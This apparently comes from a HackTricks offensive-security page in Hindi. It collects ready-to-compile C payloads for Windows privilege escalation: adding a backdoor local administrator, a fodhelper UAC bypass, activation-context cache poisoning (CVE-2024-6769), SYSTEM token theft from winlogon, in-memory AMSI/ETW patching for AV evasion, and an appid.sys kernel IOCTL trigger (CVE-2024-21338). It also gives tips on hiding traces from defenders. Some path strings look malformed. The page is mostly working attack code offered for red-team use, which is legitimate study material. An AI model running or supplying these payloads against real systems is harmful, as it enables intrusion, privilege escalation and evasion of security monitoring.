# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

यह पृष्ठ उन छोटे, स्व-निहित C स्निपेट्स को एकत्र करता है जो Windows Local Privilege Escalation या post-exploitation के दौरान उपयोगी होते हैं। प्रत्येक payload को इस तरह डिज़ाइन किया गया है कि वे **कॉपी-पेस्ट-फ्रेंडली** हों, केवल Windows API / C runtime की आवश्यकता हो, और इन्हें `i686-w64-mingw32-gcc` (x86) या `x86_64-w64-mingw32-gcc` (x64) से कंपाइल किया जा सके।

> ⚠️  ये payloads मानते हैं कि प्रक्रिया के पास पहले से ही वह न्यूनतम privileges हैं जो क्रिया करने के लिए आवश्यक होते हैं (उदा. `SeDebugPrivilege`, `SeImpersonatePrivilege`, या UAC bypass के लिए medium-integrity context)। इन्हें उन **red-team या CTF सेटिंग्स** के लिए बनाया गया है जहाँ किसी vulnerability का exploit करके arbitrary native code execution मिल चुकी हो।

---

## स्थानीय व्यवस्थापक उपयोगकर्ता जोड़ें
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
जब trusted binary **`fodhelper.exe`** चलाया जाता है, यह नीचे दिए गए registry path को query करता है **बिना `DelegateExecute` verb को filter किए।** उस key के अंतर्गत हमारी कमांड लगाने से attacker UAC को bypass कर सकता है *बिना* डिस्क पर फ़ाइल ड्रॉप किए।

*Registry path queried by `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
एक न्यूनतम PoC जो एक elevated `cmd.exe` खोलता है:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 और Windows 11 23H2 (July 2025 patches) पर परीक्षण किया गया। bypass अभी भी काम करता है क्योंकि Microsoft ने `DelegateExecute` path में गायब integrity check को ठीक नहीं किया है।*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning patched Windows 10/11 builds के खिलाफ अभी भी काम करता है क्योंकि `ctfmon.exe` एक high-integrity trusted UI process के रूप में चलता है जो caller के impersonated `C:` drive से खुशी-खुशी लोड करता है और `CSRSS` द्वारा cached किसी भी DLL redirections को reuse कर लेता है। Abuse इस प्रकार होता है: `C:` को attacker-controlled storage की ओर repoint करें, एक trojanized `msctf.dll` डालें, high integrity पाने के लिए `ctfmon.exe` लॉन्च करें, फिर `CSRSS` से एक manifest cache करने के लिए कहें जो auto-elevated binary (उदाहरण के लिए, `fodhelper.exe`) द्वारा उपयोग की जाने वाली DLL को redirect करे ताकि अगली बार लॉन्च पर आपका payload बिना UAC prompt के inherit हो जाए।

Practical workflow:
1. एक fake `%SystemRoot%\System32` tree तैयार करें और उस वैध binary की कॉपी रखें जिसे आप hijack करने का प्लान कर रहे हैं (अक्सर `ctfmon.exe`)।
2. अपने process के अंदर `C:` को remap करने के लिए `DefineDosDevice(DDD_RAW_TARGET_PATH)` का उपयोग करें, और `DDD_NO_BROADCAST_SYSTEM` रखें ताकि बदलाव local ही रहें।
3. अपना DLL + manifest फेक tree में रखें, manifest को activation-context cache में धकेलने के लिए `CreateActCtx/ActivateActCtx` कॉल करें, फिर auto-elevated binary लॉन्च करें ताकि वह redirected DLL को सीधे आपके shellcode में resolve कर ले।
4. काम खत्म होने पर cache entry (`sxstrace ClearCache`) हटाएँ या attacker fingerprints मिटाने के लिए reboot करें।

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

क्लीनअप टिप: popping SYSTEM के बाद परीक्षण करते समय `sxstrace Trace -logfile %TEMP%\sxstrace.etl` चलाएँ और उसके बाद `sxstrace Parse` — यदि आप लॉग में अपना manifest नाम देखते हैं, तो defenders भी देख सकते हैं, इसलिए हर रन पर paths बदलें।

---

## token duplication के जरिए SYSTEM shell प्राप्त करें (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
यदि वर्तमान प्रक्रिया के पास **दोनों** `SeDebug` और `SeImpersonate` privileges हैं (कई service accounts के लिए सामान्य), तो आप `winlogon.exe` से token चुरा सकते हैं, उसे duplicate कर सकते हैं, और एक elevated process शुरू कर सकते हैं:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
उसके काम करने के तरीके की विस्तृत व्याख्या के लिए देखें:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## मेमोरी में AMSI & ETW पैच (Defence Evasion)
अधिकांश आधुनिक AV/EDR इंजन दुर्भावनापूर्ण व्यवहारों की जांच के लिए **AMSI** और **ETW** पर निर्भर करते हैं। वर्तमान प्रक्रिया के अंदर दोनों इंटरफेस को जल्दी पैच करने से script-based payloads (e.g. PowerShell, JScript) को स्कैन होने से रोका जा सकता है।
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*ऊपर किया गया पैच प्रोसेस-लोकल है; इसे चलाने के बाद नया PowerShell शुरू करने पर AMSI/ETW निरीक्षण के बिना चलेगा।*

---

## चाइल्ड को Protected Process Light (PPL) के रूप में बनाएँ
बनाने के समय `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` का उपयोग करके चाइल्ड के लिए PPL protection level का अनुरोध करें। यह एक दस्तावेजीकृत API है और केवल तभी सफल होगा जब टार्गेट इमेज अनुरोधित signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb) के लिए signed हो।
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Levels used most commonly:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Process Explorer/Process Hacker में Protection column को चेक करके परिणाम सत्यापित करें।

---

## Local Service -> Kernel के जरिए `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` एक device object (`\\.\\AppID`) प्रदर्शित करता है जिसका smart-hash maintenance IOCTL user-supplied function pointers स्वीकार करता है जब भी caller `LOCAL SERVICE` के रूप में चलता है; Lazarus इसका दुरुपयोग PPL को disable करने और arbitrary drivers को load करने के लिए कर रहा है, इसलिए red teams को lab उपयोग के लिए एक तैयार trigger रखना चाहिए।

ऑपरेशनल नोट्स:
- आपको अभी भी एक `LOCAL SERVICE` token की आवश्यकता है। इसे `SeImpersonatePrivilege` का उपयोग करके `Schedule` या `WdiServiceHost` से चुराएं, फिर डिवाइस को छूने से पहले impersonate करें ताकि ACL जांच पास हो सके।
- IOCTL `0x22A018` एक struct की अपेक्षा करता है जिसमें दो callback pointers होते हैं (query length + read function)। दोनों को user-mode stubs की ओर पॉइंट करें जो token overwrite बनाते हैं या ring-0 primitives को मैप करते हैं, लेकिन buffers को RWX रखें ताकि KernelPatchGuard chain के बीच में crash न करे।
- सफलता के बाद, impersonation से बाहर निकलें और device handle को revert करें; defenders अब असामान्य `Device\\AppID` handles की तलाश करते हैं, इसलिए privilege प्राप्त होते ही इसे तुरंत बंद कर दें।

<details>
<summary>C - `appid.sys` smart-hash दुरुपयोग के लिए स्केलेटन ट्रिगर</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

एक weaponized बिल्ड के लिए न्यूनतम फिक्स-अप: `VirtualAlloc` के साथ एक RWX सेक्शन मैप करें, अपना token duplication stub वहाँ कॉपी करें, `KernelThunk = section` सेट करें, और जब `DeviceIoControl` लौटेगा तो आपको PPL के तहत भी SYSTEM होना चाहिए।

---

## संदर्भ
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – न्यूनतम PPL प्रोसेस लॉन्चर: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
